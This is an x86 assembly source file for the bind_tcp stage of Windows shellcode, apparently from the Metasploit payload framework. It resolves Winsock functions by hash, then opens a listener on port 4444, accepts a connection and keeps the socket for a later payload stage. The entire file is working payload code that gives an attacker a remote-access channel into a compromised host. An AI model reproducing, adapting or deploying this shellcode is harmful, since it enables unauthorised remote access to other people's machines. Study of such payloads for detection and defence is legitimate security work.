;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer@harmonysecurity.com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the newly connected clients socket
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

bind_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );
  
  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
  push eax               ; push null for reserved parameter
  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
  push eax               ; we do not specify a protocol
  inc eax                ;
  push eax               ; push SOCK_STREAM
  inc eax                ;
  push eax               ; push AF_INET
  push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov edi, eax           ; save the socket for later
  
  xor ebx, ebx           ; Clear EBX
  push ebx               ; bind to 0.0.0.0
  push 0x5C110002        ; family AF_INET and port 4444
  mov esi, esp           ; save a pointer to sockaddr_in struct
  push byte 16           ; length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
  push esi               ; pointer to the sockaddr_in struct
  push edi               ; socket
  push 0x6737DBC2        ; hash( "ws2_32.dll", "bind" )
  call ebp               ; bind( s, &sockaddr_in, 16 );

  push ebx               ; backlog
  push edi               ; socket
  push 0xFF38E9B7        ; hash( "ws2_32.dll", "listen" )
  call ebp               ; listen( s, 0 );

  push ebx               ; we set length for the sockaddr struct to zero
  push ebx               ; we dont set the optional sockaddr param
  push edi               ; listening socket
  push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
  call ebp               ; accept( s, 0, 0 );
  
  push edi               ; push the listening socket to close
  mov edi, eax           ; swap the new connected socket over the listening socket
  push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
  call ebp               ; closesocket( s );
  